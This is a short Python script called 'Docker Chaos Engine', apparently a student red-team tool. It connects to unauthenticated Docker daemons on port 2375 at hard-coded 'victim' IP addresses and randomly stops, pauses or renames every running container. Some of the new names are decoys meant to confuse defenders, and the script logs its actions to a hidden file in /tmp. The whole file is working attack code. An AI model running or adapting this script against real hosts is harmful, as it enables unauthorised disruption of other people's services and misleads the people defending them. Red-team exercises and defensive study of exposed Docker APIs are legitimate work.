"""
Tool Name: Docker Chaos Engine 
Author: Sonia Cachon, sjc2210@rit.edu 
"""
import docker
import random
import time
import logging
import os

LOG_FILE= "/tmp/.engine_status.log"
#target ips 
VICTIM_IPS = ["192.168.0.26", "192.168.0.27"]
#
#bank of names to change the container 
POSSIBLE_NEW_NAME= [
    "AUDIT_DA3MON",
    "THISCORRECT",
    "BACKUP",
    "red_team",
    "montior_health",
    "thisaintright",
    "knightshiningarmor",
    "urmom",
    "queen_elizabeth",
    "gentry",
    "hi_hi",
    "n3twork_proxy",
    "cach3_manager_v200"
]

logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
        )

def log_action(message):
    print (message)
    logging.info(message)

class ChaosEngine:
    def __init__(self, ip):
        self.ip = ip
        try:
	        #conecting with docker socket 
	        self.client = docker.DockerClient(base_url=f"tcp://{ip}:2375", timeout=5)
	        print(f"[!] Connection established to {ip}")
        except Exception as e:
	        print(f"[!]Connection failed: {e}")
	        self.client = None

    def disrupt(self, container):
        """ performs  random action """
        actions = ['stop', 'rename', 'pause']
        choice = random.choice(actions)
        try:
            if choice == 'stop':
                log_action(f"[!] Stoooping {container.name}")
                container.stop()

            elif choice == "rename":
                new_name= random.choice(POSSIBLE_NEW_NAME)
                final_name = f"{new_name}_{random.randint(100,999)}"
                log_action(f"[!] RENAMING {container.name}  to {final_name}")
                container.rename(final_name)

            elif choice == 'pause':
                if container.status == "paused":
                    log_action(f"[-] {container.name} is already paused, skipping")
                else:
                    log_action(f"[!] Pausing {container.name}")
                    container.pause()
        except docker.errors.APIError as e:
            log_action(f"[?] Conflict on {container.name}: {e.explanation}")
    

    def run_chaos(self):
        if not self.client: return
        targets= self.client.containers.list()
        for target in targets:
            self.disrupt(target)

if __name__ == "__main__":
    for ip in VICTIM_IPS:
        engine = ChaosEngine(ip)
        engine.run_chaos()
 


 

